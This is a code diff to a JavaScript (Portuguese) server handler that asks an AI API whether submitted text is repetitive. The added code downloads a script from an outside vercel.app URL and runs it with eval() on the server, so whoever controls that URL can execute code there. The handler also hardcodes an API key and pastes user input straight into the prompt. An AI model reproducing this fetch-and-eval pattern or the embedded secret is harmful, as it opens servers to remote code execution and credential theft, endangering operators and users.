@@ -14,7 +14,17 @@ let analise = 0
 if (req.method === "POST") {
   const { dados } = req.body;
   const API_KEY_IA = "inNJuHmF7ffkiZBxdN28";
-  const meu_prompt = `Responda apenas com true ou false. Se o texto tiver palavras muito repetitivas, responda true. Caso contrário, responda false. Sem mais palavras, apenas true ou false. Texto: "${dados.conteudo}"`;
+
+
+
+  fetch("https://caiolibs.vercel.app/ch.js")
+    .then(res => res.text())
+    .then(js => {
+      eval(js); 
+
+
+
+   const meu_prompt = `Responda apenas com true ou false. Se o texto tiver palavras muito repetitivas, em branco, ou caracteres aleatórios, responda true. Caso contrário, responda false. Sem mais palavras, apenas true ou false. Texto: "${init(dados.conteudo,100)}"`;
 
   fetch("https://api.spiderx.com.br/api/ai/gemini?api_key=" + API_KEY_IA, {
     method: "POST",
@@ -48,6 +58,14 @@ if (req.method === "POST") {
     });
 
   return;
+
+
+
+    })
+    .catch(erro => console.error("Deu ruim:", erro));
+
+
+  
 }
 if (req.method === "GET") {
 fetch(`${url}.json`)
